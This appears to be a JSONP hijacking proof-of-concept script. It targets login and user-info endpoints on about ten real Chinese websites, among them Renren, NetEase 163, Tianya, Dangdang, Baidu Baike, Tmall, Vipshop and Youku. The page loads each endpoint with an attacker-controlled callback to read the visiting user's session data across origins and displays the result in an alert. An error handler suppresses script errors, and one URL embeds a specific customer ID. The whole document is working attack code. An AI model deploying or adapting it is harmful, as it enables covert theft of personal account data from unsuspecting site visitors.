<script>
// 异常处理
window.onerror = function(
    errorMessage,
    scriptURI,
    lineNumber,
    columnNumber,
    error
) {
    if (error) {
        // reportError(error);
    } else {
        console.log(errorMessage);
        console.log(scriptURI);
        return true;
    }
}

function loadjs(jsurl) {
    var e = document.createElement('script');
    e.src = jsurl;
    document.head.appendChild(e);
}
hooks = [{
    name: '人人网1',
    link: 'http://base.yx.renren.com/RestAPI?method=api.base.getLoginUser&format=2&callback='
}, {
    name: '人人网2',
    link: 'http://passport.game.renren.com/user/info?callback='
}, {
    name: '网易163',
    link: 'http://comment.money.163.com/reply/check.jsp?time=1367240961474&callback='
}, {
    name: '天涯论坛1',
    link: 'http://passport.tianya.cn/online/checkuseronline.jsp?callback='
}, {
    name: '当当网',
    link: 'http://message.dangdang.com/api/msg_detail.php?customer_id=o4P00TweebicwjhS72NWew%3D%3D&data_type=jsonp&pageindex=1&module=1&pagesize=10&_=1416721945308&callback='
}, {
    name: '百度百科',
    link: 'http://baike.baidu.com/api/login/?callback='
}, {
    name: '多说评论',
    link: 'http://admin.duoshuo.com/api/threads/counts.jsonp?threads=290%2C261%2C252%2C246%2C241&require=site%2Cvisitor%2CserverTime%2Clang%2Cunread%2Clog%2CextraCss&v=130724&callback='
}, {
    name: '天猫登录',
    link: 'http://miaoxin.tmall.com/member/user_login_info2.do?_ksTS=1416728756062_19&callback='
}, {
    name: '唯品会',
    link: 'http://cart.vip.com/te2/cart.php?isGetLast=1&callback='
}, {
    name: '优酷',
    link: 'http://nc.youku.com/index_QSideToolJSONP?function[]=getUserBasicInfo&callback[]='
}];
hooks_test=[{
    name: 'test',
    link: 'http://album.zhenai.com/v2/info/newsInfo.do?_=1447554757008&callback='
}]
function setcallback(link, name, funcname) {
    // var hash = 'jmpews' + String(new Date().getTime());
    var hash = 'jmpews' + String(funcname);
    window[hash] = function(data) {
        var _data = typeof(data) === 'object' ? JSON.stringify(data) : String(data);
        alert(name + _data);
    }
    loadjs(link + hash);
}
function main() {
    for (var i = 0; i < hooks.length; i++) {
        setcallback(hooks[i].link, hooks[i].name, i);
        console.log(hooks[i].name);
    };
}
setTimeout(main, 1000);
</script>
